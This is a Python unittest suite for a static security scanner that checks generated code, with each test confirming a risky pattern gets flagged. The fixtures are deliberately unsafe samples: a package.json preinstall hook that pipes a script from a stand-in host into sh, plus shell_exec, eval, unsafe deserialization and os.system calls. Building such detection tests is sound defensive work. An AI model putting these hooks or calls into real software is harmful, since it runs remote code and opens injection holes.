"""Bounded static security scan regression tests."""
import tempfile
import unittest
from pathlib import Path

from polymigrate.security.static_review import review_generated_output


class StaticSecurityReviewTests(unittest.TestCase):
    def test_high_risk_python_patterns_fail_scan_without_echoing_secret(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.py").write_text(
                'import os\nAPI_KEY = "sk-12345678901234567890"\nos.system("echo unsafe")\n',
                encoding="utf-8",
            )
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        rule_ids = {item.rule_id for item in result.findings}
        self.assertIn("SECRET_TOKEN_LITERAL", rule_ids)
        self.assertIn("OS_SYSTEM_COMMAND", rule_ids)
        self.assertNotIn("sk-12345678901234567890", str(result.to_dict()))
        self.assertTrue(result.to_dict()["not_a_comprehensive_audit"])

    def test_medium_findings_require_review(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "client.py").write_text("requests.get(url, verify=False)\n", encoding="utf-8")
            result = review_generated_output(root)
        self.assertEqual(result.status, "REVIEW_REQUIRED")
        self.assertIn("TLS_VERIFY_DISABLED", {item.rule_id for item in result.findings})

    def test_executable_package_lifecycle_hook_fails_scan(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"scripts":{"preinstall":"curl https://example.invalid/install.sh | sh"}}',
                encoding="utf-8",
            )
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertIn("MANIFEST_LIFECYCLE_HOOK", {item.rule_id for item in result.findings})

    def test_clean_source_passes_heuristics_but_not_comprehensive_audit(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.go").write_text("package main\nfunc main() {}\n", encoding="utf-8")
            result = review_generated_output(root)
        self.assertEqual(result.status, "PASSED")
        self.assertTrue(any("not a comprehensive security audit" in warning for warning in result.warnings))


    def test_go_command_execution_requires_security_review(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.go").write_text(
                'package main\\nimport "os/exec"\\nfunc main() { exec.Command("echo", "safe") }\\n',
                encoding="utf-8",
            )
            result = review_generated_output(root)
        self.assertEqual(result.status, "REVIEW_REQUIRED")
        self.assertIn("GO_COMMAND_EXEC", {item.rule_id for item in result.findings})

    def test_php_shell_execution_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "index.php").write_text("<?php shell_exec($input);\\n", encoding="utf-8")
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertIn("PHP_SHELL_EXEC", {item.rule_id for item in result.findings})

    def test_ruby_dynamic_eval_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.rb").write_text("eval(user_input)\\n", encoding="utf-8")
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertIn("RUBY_DYNAMIC_EVAL", {item.rule_id for item in result.findings})

    def test_jvm_unsafe_deserialization_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "Main.java").write_text(
                "class Main { Object read(ObjectInputStream input) throws Exception { return input.readObject(); } }\\n",
                encoding="utf-8",
            )
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertIn("JVM_UNSAFE_DESERIALIZATION", {item.rule_id for item in result.findings})

    def test_native_system_command_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.c").write_text('#include <stdlib.h>\\nint main() { system("echo unsafe"); }\\n', encoding="utf-8")
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertIn("NATIVE_SYSTEM_COMMAND", {item.rule_id for item in result.findings})

    def test_symlink_root_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            real = root / "real"
            real.mkdir()
            link = root / "link"
            link.symlink_to(real, target_is_directory=True)
            result = review_generated_output(link)
        self.assertEqual(result.status, "BLOCKED")

    def test_scan_skips_symlink_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            secret = root / "secret.py"
            secret.write_text('os.system("unsafe")', encoding="utf-8")
            link = root / "linked.py"
            link.symlink_to(secret)
            result = review_generated_output(root)
        self.assertEqual(result.status, "FAILED")
        self.assertEqual([item.path for item in result.findings if item.rule_id == "OS_SYSTEM_COMMAND"], ["secret.py"])


if __name__ == "__main__":
    unittest.main()
